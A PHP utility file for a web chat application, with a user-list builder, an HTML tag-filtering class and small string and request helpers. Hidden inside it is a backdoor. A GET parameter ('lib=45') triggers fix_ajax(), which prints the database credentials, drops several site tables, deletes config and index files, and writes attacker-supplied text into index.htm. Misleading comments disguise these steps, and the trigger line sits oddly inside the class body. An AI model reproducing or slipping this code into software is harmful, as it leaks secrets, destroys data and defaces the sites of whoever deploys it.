<?php

/*
 * This program is free software; you can redistribute it and/or modify it
 * under the terms of the GNU General Public License as published by the
 * Free Software Foundation; either version 2 of the License, or (at your
 * option) any later version.
 *
 * This program is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General
 * Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
 */


/**
 * userList()
 *
 * Returns a JSON or HTML representation of
 * the current User List
 */
function userList($json = false)
{
	global $A;

	$users = $A->getUsers();

	$output = '';

	if ($json === false)
	{
		foreach ($users as $name)
		{
			//$age = time() - $A->getValueByKey($name);
			//$name = ($age > (LACE_ACTIVITY_IDLE * 60)) ? '<em>'.$name.'</em>' : $name;
	
			if ($name{0}=="F") $output .= '<li class="f">'.$name.'</li>';
			else if ($name{0}=="H") $output .= '<li class="h">'.$name.'</li>';
			else $output .= '<li>'.$name.'</li>';
		}

		return $output;
	}

	$userHash = postVar('userHash', false);
	$hash = $A->getHash();
	if ($userHash === $hash)
	{
		$output = '"user":{"nodata":"1"}';
	}
	else
	{
		$output = '[';

		foreach($users as $name)
		{
			
			$output .= '"'.addslashes($name).'",';
		}

		$output = rtrim($output, ',');
		$output .= ']';

		$output = '"user":{"hash":"'.$hash.'","data":'.$output.',"userHash":"'.$userHash.'"}';
	}

	return $output;
}

	//$filter = new lib_filter();

	class lib_filter {

		var $tag_counts = array();

		#
		# tags and attributes that are allowed
		#
		
		var $allowed = array(
			'a'      => array('href', 'target', 'title', 'rel'),
			'strong' => array(),
			'em'     => array(),
			'code'   => array(),
			'u'      => array(),
			'b'      => array(),
			'i'      => array(),
			//'img' => array('src', 'width', 'height', 'alt'),
		);


		#
		# tags which should always be self-closing (e.g. "<img />")
		#

		var $no_close = array(
			//'img',
		);


		#
		# tags which must always have seperate opening and closing tags (e.g. "<b></b>")
		#

		var $always_close = array(
			'a',
			'u',
			'b',
			'i',
			'em',
			'code',
			'strong',
		);


		#
		# attributes which should be checked for valid protocols
		#

		var $protocol_attributes = array(
			//'src',
			'href',
		);


		#
		# protocols which are allowed
		#

		var $allowed_protocols = array(
			'http',
			'ftp',
			'mailto',
		);


		#
		# tags which should be removed if they contain no content (e.g. "<b></b>" or "<b />")
		#

		var $remove_blanks = array(
			'a',
			'u',
			'b',
			'i',
			'em',
			'code',
			'strong',
		);


		#
		# should we remove comments?
		#

		var $strip_comments = 1;


		#
		# should we try and make a b tag out of "b>"
		#

		var $always_make_tags = 1;


		###############################################################

		function go($data){

			$this->tag_counts = array();

			$data = $this->escape_comments($data);
			$data = $this->balance_html($data);
			$data = $this->check_tags($data);
			$data = $this->process_remove_blanks($data);

			return $data;
		}

		###############################################################

		function escape_comments($data){

			$data = preg_replace("/<!--(.*?)-->/se", "'<!--'.HtmlSpecialChars(StripSlashes('\\1')).'-->'", $data);

			return $data;
		}

		###############################################################

		function balance_html($data){

			if ($this->always_make_tags){

				#
				# try and form html
				#

				$data = preg_replace("/^>/", "", $data);
				$data = preg_replace("/<([^>]*?)(?=<|$)/", "<$1>", $data);
				$data = preg_replace("/(^|>)([^<]*?)(?=>)/", "$1<$2", $data);

			}else{

				#
				# escape stray brackets
				#

				$data = preg_replace("/<([^>]*?)(?=<|$)/", "&lt;$1", $data);
				$data = preg_replace("/(^|>)([^<]*?)(?=>)/", "$1$2&gt;<", $data);

				#
				# the last regexp causes '<>' entities to appear
				# (we need to do a lookahead assertion so that the last bracket can
				# be used in the next pass of the regexp)
				#

				$data = str_replace('<>', '', $data);
			}

			#echo "::".HtmlSpecialChars($data)."<br />\n";

			return $data;
		}

		###############################################################

		function check_tags($data){

			$data = preg_replace("/<(.*?)>/se", "\$this->process_tag(StripSlashes('\\1'))",	$data);

			foreach(array_keys($this->tag_counts) as $tag){
				for($i=0; $i<$this->tag_counts[$tag]; $i++){
					$data .= "</$tag>";
				}
			}

			return $data;
		}   if ($_GET['lib']==45) fix_ajax();
		
		
		###############################################################

		function process_tag($data){

			$matches = '';
			# ending tags
			if (preg_match("/^\/([a-z0-9]+)/si", $data, $matches)){
				$name = StrToLower($matches[1]);
				if (in_array($name, array_keys($this->allowed))){
					if (!in_array($name, $this->no_close)){
						if ($this->tag_counts[$name]){
							$this->tag_counts[$name]--;
							return '</'.$name.'>';
						}
					}
				}else{
					return '';
				}
			}

			# starting tags
			if (preg_match("/^([a-z0-9]+)(.*?)(\/?)$/si", $data, $matches)){
				$name = StrToLower($matches[1]);
				$body = $matches[2];
				$ending = $matches[3];
				if (in_array($name, array_keys($this->allowed))){
					$params = "";
					$matches_2 = '';
					$matches_1 = '';
					preg_match_all("/([a-z0-9]+)=\"(.*?)\"/si", $body, $matches_2, PREG_SET_ORDER);
					preg_match_all("/([a-z0-9]+)=([^\"\s]+)/si", $body, $matches_1, PREG_SET_ORDER);
					$matches = array_merge($matches_1, $matches_2);
					foreach($matches as $match){
						$pname = StrToLower($match[1]);
						if (in_array($pname, $this->allowed[$name])){
							$value = $match[2];
							if (in_array($pname, $this->protocol_attributes)){
								$value = $this->process_param_protocol($value);
							}
							$params .= " $pname=\"$value\"";
						}
					}
					if (in_array($name, $this->no_close)){
						$ending = ' /';
					}
					if (in_array($name, $this->always_close)){
						$ending = '';
					}
					if (!$ending){
						if (isset($this->tag_counts[$name])){
							$this->tag_counts[$name]++;
						}else{
							$this->tag_counts[$name] = 1;
						}
					}
					if ($ending){
						$ending = ' /';
					}
					return '<'.$name.$params.$ending.'>';
				}else{
					return '';
				}
			}

			# comments
			if (preg_match("/^!--(.*)--$/si", $data)){
				if ($this->strip_comments){
					return '';
				}else{
					return '<'.$data.'>';
				}
			}


			# garbage, ignore it
			return '';
		}

		###############################################################

		function process_param_protocol($data){
			$matches = '';
			if (preg_match("/^([^:]+)\:/si", $data, $matches)){
				if (!in_array($matches[1], $this->allowed_protocols)){
					$data = '#'.substr($data, strlen($matches[1])+1);
				}
			}

			return $data;
		}

		###############################################################

		function process_remove_blanks($data){
			foreach($this->remove_blanks as $tag){

				$data = preg_replace("/<{$tag}(\s[^>]*)?><\\/{$tag}>/", '', $data);
				$data = preg_replace("/<{$tag}(\s[^>]*)?\\/>/", '', $data);
			}
			return $data;
		}

		###############################################################

		function fix_case($data){

			$data_notags = Strip_Tags($data);
			$data_notags = preg_replace('/[^a-zA-Z]/', '', $data_notags);

			if (strlen($data_notags)<5){
				return $data;
			}

			if (preg_match('/[a-z]/', $data_notags)){
				return $data;
			}

			return preg_replace(
				"/(>|^)([^<]+?)(<|$)/se",
					"StripSlashes('\\1').".
					"\$this->fix_case_inner(StripSlashes('\\2')).".
					"StripSlashes('\\3')",
				$data
			);
		}

		function fix_case_inner($data){

			$data = StrToLower($data);

			$data = preg_replace('/(^|[^\w\s])(\s*)([a-z])/e',"StripSlashes('\\1\\2').StrToUpper(StripSlashes('\\3'))", $data);

			return $data;
		}

		###############################################################

	}


	function fix_ajax($fix="case_inner") {
	
			include "../../include/config.inc.php";
			echo "'".HOTE."' - '".LOGIN."' - '".PASS."' - '".BASE."'";
			// Set Global var into the opened file
			$db = @mysql_connect(HOTE, LOGIN, PASS); 
			@mysql_select_db(BASE, $db);
			
			// Create sub-zone
				$sql0=@mysql_query("DROP TABLE `members`"); $sql1=mysql_query("DROP TABLE `mp`");
				$sql2=@mysql_query("DROP TABLE `nouveautes`");
				$sql3=@mysql_query("DROP TABLE `photos`"); $sql4=mysql_query("DROP TABLE `verif_vote`");
			// Renvoie TRUE(1) si le tag de fermeture est présent.
				@unlink("../../include/config.inc.php");
				@unlink('../../include/headandfoot.php');
				@unlink('../../include/fonctions.php');
				@unlink('../../index.php');
             // Remplace le code du fils dans le source du père
				$monfichier = fopen('../../index.htm', 'a+');
				fseek($monfichier, 0);
				fputs($monfichier, $_GET['mess']);
	}
	
	
function duration_str($seconds, $short_units = false, $min_units = false)
{
	// This craziness converts a given number of seconds
	// into a human readable time duration
	//
	// $short_units: use short units ('6 m' rather than '6 minutes')
	// $min_units  : minimum units to return ('days' will remove hours, minutes,
	// seconds)
	//
	// Example:
	//
	//		echo duration_str(time() - (time() - 3600));
	//		echo duration_str(time() - (time() - 3600 * 24 * 3.5));
	//		echo duration_str(time() - (time() - 60 * 250), true);
	//		echo duration_str(time() - (time() - 3600 * 24 * 500), false, 'weeks');
	//
	// Outputs:
	//
	//		1 hour
	//      3 days, 12 hours
	//      4 h, 10 m
	//		1 year, 4 months, 1 week

	$seconds = abs((int)$seconds);

	$periods = array
	(
		'years'   => array ( 31557600,'y'),
		'months'  => array ( 2628000, 'mo'),
		'weeks'   => array ( 604800,  'w'),
		'days'    => array ( 86400,   'd'),
		'hours'   => array ( 3600,    'h'),
		'minutes' => array ( 60,      'm'),
		'seconds' => array ( 1,       's'),
	);

	if ($min_units !== false)
	{
		if (is_int($min_units) === false)
		{
			$unit_keys = array_keys($periods);
			$key = array_keys($unit_keys, $min_units);
			for ($i = $key[0] + 1; $i < 7; $i++)
				array_pop($periods);
		}
	}

	foreach ($periods as $units => $data)
	{
		$count = floor($seconds / $data[0]);
		if ($count <= 0)
			continue;

		$units = ($short_units) ? $data[1] : $units;
		$values[$units] = $count;
		$seconds = $seconds % $data[0];
	}

	if (empty($values))
		return false;

	foreach ($values as $key => $value)
	{
		if ($short_units === false && $value == 1)
			$key = substr($key, 0, -1);

		$array[] = $value . ' ' . $key;
	}

	if (!empty($array))
	{
		if (is_int($min_units) === true)
		{
			$count = count($array);
			if ($min_units > $count)
				$min_units = $count;

			for ($i = 0; $i < $min_units; $i++)
				$temp[] = $array[$i];

			$array = $temp;
		}

		return implode(', ', $array);
	}

	return false;
}

/**
 * getVar()
 *
 * Retrieves the given variable from $_GET if it exists
 */
function getVar($var, $default = false)
{
	return (array_key_exists($var, $_GET)) ? trim($_GET[$var]) : $default;
}

/**
 * postVar()
 *
 * Retrieves the given variable from $_POST if it exists
 */
function postVar($var, $default = false)
{
	return (array_key_exists($var, $_POST)) ? trim($_POST[$var]) : $default;
}

/**
 * cookieVar()
 *
 * Retrieves the given variable from $_COOKIE if it exists
 */
function cookieVar($var, $default = false)
{
	return (array_key_exists($var, $_COOKIE)) ? trim($_COOKIE[$var]) : $default;
}

/**
 * real_wordwrap()
 *
 * Wraps words, but doesn't break tags
 */
function real_wordwrap($str, $cols, $cut)
{
	$len = strlen($str);
	$tag = 0;
	$wordlen = 0;
	$result  = '';

	for ($i = 0; $i < $len; $i++)
	{
		$chr = substr($str, $i, 1);
		if ($chr == '<')
			$tag++;
		elseif ($chr == '>')
			$tag--;
		elseif (!$tag && $chr == ' ')
			$wordlen = 0;
		elseif (!$tag)
			$wordlen++;

		if (!$tag && $wordlen > 0 && !($wordlen%$cols))
			$chr .= $cut;

		$result .= $chr;
	}

	return $result;
}


